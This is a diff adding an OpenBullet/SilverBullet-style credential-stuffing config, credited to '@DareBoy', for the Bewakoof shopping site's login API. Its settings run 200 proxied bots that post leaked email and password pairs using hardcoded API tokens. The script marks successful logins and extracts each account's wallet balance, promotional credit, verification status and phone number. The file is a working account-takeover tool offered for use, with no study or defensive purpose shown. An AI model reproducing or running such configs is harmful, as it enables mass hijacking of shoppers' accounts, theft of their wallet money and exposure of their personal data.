@@ -1,0 +1,114 @@
+[SETTINGS]
+{
+  "Name": "Bewakoof (WEB-API)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-09-28T08:49:35.3988187+05:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@DareBoy",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Bewakoof (WEB-API)",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://www.bewakoof.com/v1/authentication" 
+  CONTENT "{\"authentication\":{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"referrer_code\":null}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-GB,en-US;q=0.9,en;q=0.8" 
+  HEADER "api-token: MWY5ZTNmNzFmN2M1ZTUyMjkwNjM2NGMzNmNjZTA3N2Q6M2RhMmI3OTgtNTY2MC00ZDRhLWJhZWQtNTZlMDI2MWRlYmZm" 
+  HEADER "client-device-token: MWY5ZTNmNzFmN2M1ZTUyMjkwNjM2NGMzNmNjZTA3N2Q6M2RhMmI3OTgtNTY2MC00ZDRhLWJhZWQtNTZlMDI2MWRlYmZm" 
+  HEADER "content-length: 97" 
+  HEADER "content-type: application/json" 
+  HEADER "isbshotsapp: false" 
+  HEADER "origin: https://www.bewakoof.com" 
+  HEADER "referer: https://www.bewakoof.com/login/email" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "switch-platform: false" 
+  HEADER "token: 77aac95cc11103c482c33e46a25d8844" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36" 
+  HEADER "x-http-method-override: POST" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"id" 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+
+PARSE "<SOURCE>" LR "\",\"wallet_amount\":" ",\"" -> CAP "Balance" 
+
+PARSE "<SOURCE>" LR "\",\"non_promotional_wallet_amount\":\"0.0\",\"referral_code\":\"JUH5U70O\",\"promotional_wallet_amount\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Promotional Wallet" 
+
+PARSE "<SOURCE>" LR "\"is_verified\":" ",\"" -> VAR "sed" 
+
+PARSE "<SOURCE>" LR ",\"phone\":\"" "\"}" CreateEmpty=FALSE -> CAP "Mobile Number" 
+
+FUNCTION Translate 
+  KEY "0" VALUE "Not Verified" 
+  KEY "1" VALUE "Verified" 
+  "<sed>" -> CAP "Verify" 
+
+FUNCTION Constant "@DareBoy" -> CAP "Config By" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Balance>" Contains "0" 
+    KEY "<Balance>" LessThan "1" 
+
